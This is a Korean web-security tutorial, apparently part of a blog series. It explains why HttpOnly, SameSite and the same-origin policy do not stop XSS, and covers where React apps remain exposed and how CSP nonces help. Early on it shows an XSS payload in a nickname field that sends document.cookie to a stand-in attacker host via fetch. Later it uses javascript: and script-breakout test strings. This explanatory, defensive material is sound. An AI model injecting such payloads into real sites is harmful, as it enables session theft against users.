11편 마지막에 이런 문장이 있었습니다. "`HttpOnly`는 쿠키를 훔쳐 가는 것을 막지만, 공격 스크립트가 사용자의 쿠키로 요청을 보내는 것까지는 막지 못합니다." 로그인 쿠키에 `HttpOnly`, `Secure`, `SameSite`를 다 붙였다면 꽤 안전하다고 느낄 겁니다. 이번 글은 왜 그걸로는 충분하지 않은지, XSS가 왜 웹 보안에서 가장 무서운 취약점으로 꼽히는지 정리합니다.

## XSS는 "우리 사이트의 코드로" 실행된다

**XSS(Cross-Site Scripting)는 공격자가 넣은 스크립트가 우리 사이트의 페이지 안에서 실행되는 공격**입니다. 게시글 본문, 닉네임, 검색어처럼 사용자가 입력한 값을 화면에 그대로 HTML로 넣을 때 생깁니다.

```text
닉네임: <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
```

이 닉네임을 HTML로 그대로 넣으면, 이미지 로드가 실패하면서 `onerror`의 스크립트가 실행됩니다. 이 스크립트가 무서운 이유는 **어디에서 실행되느냐**입니다.

- 10편의 동일 출처 정책은 **다른 출처**의 스크립트가 우리 응답을 읽지 못하게 막습니다. 그런데 이 스크립트는 `shop.com` 페이지 안에서 돌고 있으니 **`shop.com` 출처**입니다. 막을 대상이 아닙니다.
- 11편의 SameSite는 **다른 사이트에서 시작된** 요청에 쿠키를 붙이지 않습니다. 이 스크립트의 요청은 `shop.com`에서 시작됐으니 **같은 사이트**입니다. 쿠키가 그대로 붙습니다.

10편과 11편의 방어는 모두 "다른 출처나 다른 사이트에서 온 공격"을 막는 장치입니다. XSS는 공격 코드를 **우리 사이트 안으로 들여보내서** 그 경계를 통째로 넘어갑니다.

## HttpOnly가 막는 것과 못 막는 것

`HttpOnly`를 붙이면 위 예시의 `document.cookie`에서 세션 쿠키가 빠집니다. 쿠키 값을 공격자 서버로 **훔쳐 가는 것**은 막힙니다. 하지만 공격 스크립트는 쿠키 값을 몰라도 됩니다.

| 공격 스크립트가 할 수 있는 일 | HttpOnly로 막히나 |
| --- | --- |
| `document.cookie`로 세션 쿠키를 읽어 공격자에게 보내기 | **막힘** |
| `fetch("/api/me")`로 내 정보를 읽어 공격자에게 보내기 (쿠키는 브라우저가 붙임) | 안 막힘 |
| `fetch("/api/password", { method: "POST" })`로 비밀번호·이메일 변경 | 안 막힘 |
| 페이지에 있는 CSRF 토큰을 읽어 위조 요청에 넣기 | 안 막힘 |
| 화면에 가짜 로그인 창을 띄우거나, 입력하는 내용을 가로채기 | 안 막힘 |
| `localStorage`에 저장된 액세스 토큰 읽기 | 안 막힘 |

공격자는 사용자의 브라우저를 **원격 조종하듯** 사용자 권한으로 무엇이든 할 수 있습니다. 차이는 사용자가 페이지를 닫으면 끝난다는 것 정도입니다. 쿠키를 훔쳤다면 나중에도 쓸 수 있으니, `HttpOnly`는 **피해가 오래가는 것**을 막아 주는 장치라고 보면 정확합니다. 마지막 줄 때문에 액세스 토큰을 `localStorage`에 두는 방식이 위험하다는 말이 나옵니다. XSS 한 번에 토큰이 바로 새어 나갑니다.

## XSS의 세 가지 경로

| 종류 | 공격 코드가 들어오는 길 |
| --- | --- |
| 저장형 (Stored) | 게시글·댓글·프로필처럼 **DB에 저장된 값**이 다른 사용자의 화면에 그려짐. 피해가 가장 큼 |
| 반사형 (Reflected) | URL의 검색어 같은 값을 서버가 응답 HTML에 그대로 넣음. 조작된 링크를 누르게 해야 함 |
| DOM 기반 | 서버를 거치지 않고, 클라이언트 코드가 `location.hash` 같은 값을 `innerHTML`로 넣음 |

세 가지 모두 원인은 같습니다. **신뢰할 수 없는 값을 "코드"로 해석될 수 있는 자리에 넣었다**는 것입니다.

## React가 막아 주는 것

React는 JSX의 `{}`에 넣은 문자열을 **항상 글자로** 처리합니다. 위의 악성 닉네임을 `<p>{nickname}</p>`로 그리면, 태그가 실행되지 않고 `<img src=x ...>`라는 **글자**가 화면에 보입니다. DOM의 `textContent`로 넣는 것과 같아서 HTML로 해석될 틈이 없습니다.

문자열을 HTML에 직접 끼워 넣어야 하는 환경이라면 같은 일을 이스케이프로 합니다.

```js
function escapeHtml(text) {
  const map = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
  return text.replace(/[&<>"']/g, (ch) => map[ch]);
}

console.log(escapeHtml('<img src=x onerror="alert(1)">')); // &lt;img src=x onerror=&quot;alert(1)&quot;&gt;
```

React를 쓰면 대부분의 XSS가 기본으로 막힙니다. 그래서 React 앱의 XSS는 거의 항상 **아래의 빈틈**에서 생깁니다.

## React에서도 생기는 빈틈

### 1. dangerouslySetInnerHTML

```jsx
<div dangerouslySetInnerHTML={{ __html: post.contentHtml }} />
```

이름 그대로 위험합니다. 에디터로 쓴 글이나 마크다운을 변환한 HTML처럼 **HTML을 그대로 보여 줘야 할 때**만 쓰고, 넣기 전에 반드시 **DOMPurify** 같은 라이브러리로 허용한 태그와 속성만 남깁니다. 마크다운 변환기도 HTML 원문을 통과시키는 옵션이 켜져 있으면 같은 문제가 생깁니다.

### 2. 사용자 입력을 링크 주소로

```jsx
<a href={user.website}>홈페이지</a>
```

`user.website`가 `javascript:alert(1)`이면 링크를 누르는 순간 스크립트가 실행됩니다. React 19는 `href`나 `src`에 들어온 `javascript:` URL을 실행하지 않고, 누르면 에러를 던지는 코드로 바꿔 넣습니다. 하지만 다른 위험한 스킴이나 리다이렉트 용도까지 생각하면, **허용할 프로토콜만 통과시키는 것**이 안전합니다.

```js
function safeUrl(input) {
  try {
    const url = new URL(input, "https://shop.com");
    return url.protocol === "https:" || url.protocol === "http:" ? url.href : "#";
  } catch {
    return "#";
  }
}

console.log(safeUrl("javascript:alert(1)")); // #
console.log(safeUrl("  JavaScript:alert(1)")); // #
console.log(safeUrl("/users/1")); // https://shop.com/users/1
```

문자열이 `"javascript:"`로 시작하는지 직접 검사하면, 앞의 공백이나 대소문자 섞기로 쉽게 우회됩니다. `URL`로 파싱한 뒤 `protocol`을 확인하는 이유입니다.

### 3. script 태그 안에 넣는 JSON

서버에서 초기 데이터를 HTML에 심을 때 자주 생깁니다.

```jsx
<script dangerouslySetInnerHTML={{ __html: `window.__DATA__ = ${JSON.stringify(data)}` }} />
```

`JSON.stringify`는 따옴표는 이스케이프하지만 `</script>`는 그대로 둡니다. 브라우저의 HTML 파서는 JavaScript 문법과 상관없이 `</script>`를 보면 태그를 닫아 버립니다.

```js
const data = { bio: "</script><script>alert(1)</script>" };

const unsafe = JSON.stringify(data);
console.log(unsafe.includes("</script>")); // true

const safe = JSON.stringify(data).replace(/</g, "\\u003c");
console.log(safe.includes("</script>")); // false
console.log(JSON.parse(safe).bio === data.bio); // true
```

`<`를 `<`로 바꾸면 HTML 파서는 태그로 보지 않고, JavaScript가 읽을 때는 원래 글자로 돌아옵니다.

### 4. React를 거치지 않는 코드

`ref.current.innerHTML = ...`, `eval`, `new Function`, `setTimeout("문자열")`처럼 React 바깥에서 DOM이나 코드를 직접 다루면 React의 보호를 받지 못합니다. 사용자가 보낸 객체를 `<div {...props}>`처럼 통째로 펼치는 것도 위험합니다. 그 객체에 `dangerouslySetInnerHTML`이 들어 있을 수 있으니까요.

## 두 번째 방어선: CSP

이스케이프는 실수 하나로 뚫립니다. 그래서 **뚫려도 스크립트가 실행되지 않게** 하는 두 번째 방어선을 둡니다. **CSP(Content Security Policy)는 이 페이지에서 어떤 스크립트를 실행해도 되는지 서버가 응답 헤더로 브라우저에 알려 주는 규칙**입니다.

```text
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'self'
```

- **nonce:** 요청마다 새로 만드는 무작위 값입니다. 서버가 넣은 `<script nonce="r4nd0m">`만 실행되고, 공격자가 끼워 넣은 스크립트는 nonce를 모르니 실행되지 않습니다.
- **`'strict-dynamic'`:** nonce로 허락된 스크립트가 불러오는 스크립트는 함께 허락합니다.
- 인라인 이벤트 속성(`onerror="..."`)도 기본으로 막힙니다.

Next.js에서는 proxy에서 요청마다 nonce를 만들어 CSP 헤더와 함께 넘기고, Next.js가 자기 스크립트에 그 nonce를 붙여 줍니다. 요청마다 값이 달라야 하므로 그 페이지는 동적 렌더링이 됩니다. 처음 도입할 때는 `Content-Security-Policy-Report-Only` 헤더로 **막지 않고 위반만 보고받으면서** 깨지는 곳을 먼저 찾는 것이 안전합니다.

## 정리

| 방어 | 막는 것 |
| --- | --- |
| 출력 이스케이프 (React 기본 동작) | 입력값이 HTML로 해석되는 것 |
| HTML 정화 (DOMPurify) | `dangerouslySetInnerHTML`로 넣는 HTML 속의 스크립트 |
| URL 프로토콜 검사 | `javascript:` 링크 |
| `<` 이스케이프 | `<script>` 안 JSON에서 태그 탈출 |
| CSP | 이스케이프가 뚫렸을 때 스크립트 실행 자체 |
| HttpOnly | 쿠키를 훔쳐 가서 나중에 쓰는 것 |

> "XSS로 실행된 스크립트는 우리 페이지 안에서 우리 출처의 코드로 돌기 때문에, 다른 출처를 막는 동일 출처 정책도, 다른 사이트의 요청을 막는 SameSite도 통과합니다. HttpOnly는 document.cookie로 쿠키를 훔쳐 가는 것만 막고, 스크립트가 사용자의 쿠키가 붙은 요청을 보내 정보를 읽거나 비밀번호를 바꾸는 것은 막지 못합니다. React는 JSX에 넣은 문자열을 글자로 처리해 대부분의 XSS를 막지만, dangerouslySetInnerHTML, 사용자 입력을 넣은 href, script 태그 안의 JSON, innerHTML 같은 직접 DOM 조작에는 빈틈이 있습니다. 그래서 HTML 정화와 URL 프로토콜 검사로 빈틈을 막고, CSP의 nonce로 뚫렸을 때도 스크립트가 실행되지 않게 합니다."
